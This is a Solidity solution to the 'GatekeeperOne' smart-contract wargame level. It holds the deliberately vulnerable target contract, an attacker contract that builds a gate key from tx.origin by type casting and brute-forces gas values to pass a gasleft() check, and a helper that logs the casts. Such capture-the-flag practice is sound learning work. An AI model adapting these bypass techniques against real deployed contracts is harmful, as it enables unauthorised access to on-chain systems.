// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract RegisterAsEntrant {
    
    GatekeeperOne gatekeeperOne;
    
    constructor(address _gatekeeperOne) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }
    
    function knock() public returns (bool) {
        bytes8 gateKey = bytes8(uint64(uint16(tx.origin)) + 2 ** 32); // See TestCasting contract
        
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", gateKey);
        
        // Using Remix's debugger, we can see that gateTwo() causes a revert at execution step 74
        // where 252 gas has been consumed. Gas consumption could change based on the compiler
        // therefore let's try different gas values until we hit the right one. Using the low-level call()
        // won't propagate the reverts and will simply return false until we pass gateTwo().
        // We use a buffer of 50 on both sides of 252 to make sure we hit the one that makes gateTwo() pass.
        for (uint i = 0; i < 100; i++) {
            uint256 gas = 202 + i + 8191 * 100;
            
            (bool success,) = address(gatekeeperOne).call{gas: gas}(payload);
            
            if (success) { 
                return true;
            }
        }
        
        return false;
    }
}

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol';

contract GatekeeperOne {

    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract TestCasting {
    
    event LogInt(
        uint idx,
        uint val
        );
        
    event LogBytes(
        uint idx,
        bytes8 val
        );
    
    function test() public {
        uint16 one = uint16(tx.origin);
        uint64 two = uint64(uint16(tx.origin));
        uint64 three = uint64(uint16(tx.origin)) + 2 ** 32; // Overflow with + 2 ** 32 to get a uint32
        
        bytes8 four = bytes8(three);
        
        emit LogInt(1, one);
        emit LogInt(2, two);
        emit LogInt(3, three);
        
        emit LogBytes(1, four);
    }
}